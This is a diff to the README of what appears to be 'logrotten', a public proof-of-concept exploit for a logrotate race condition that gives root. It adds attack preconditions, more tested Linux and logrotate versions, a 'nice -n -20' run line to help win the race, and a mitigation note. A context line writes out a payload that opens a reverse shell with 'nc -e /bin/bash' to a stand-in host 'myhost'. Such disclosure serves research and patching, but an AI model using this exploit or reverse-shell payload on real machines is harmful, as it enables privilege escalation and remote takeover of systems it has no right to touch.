@@ -16,9 +16,18 @@
     ( https://ctftime.org/event/718 )
   - A detailed description and a PoC of this challenge was written by the 
   - nsogroup ( https://blog.nsogroup.com/logrotate-zajebiste-500-points/ )
+ 
+## Precondition for privilege escalation
+  - Logrotate has to be executed as root
+  - The logpath needs to be in control of the attacker
+  - "create" option is set in the logrotate configuration
 
 ## Tested version
   - Debian GNU/Linux 9.5 (stretch)
+  - Amazon Linux 2 AMI (HVM)
+  - Ubuntu 18.04.1
+  - logrotate 3.8.6
+  - logrotate 3.11.0
   - logrotate 3.15.0
 
 ## Compile
@@ -31,8 +40,10 @@ echo "if [ `id -u` -eq 0 ]; /bin/nc -e /bin/bash myhost 3333 &; fi" > payloadfil
 
 ## Run exploit
 ```
-./logrotten /tmp/log/pwnme.log payloadfile
+nice -n -20 ./logrotten /tmp/log/pwnme.log payloadfile
 ```
+## Known Problems
+  - It's hard to win the race inside a docker container
 
 ## Mitigation
   - make sure that logpath is owned by root
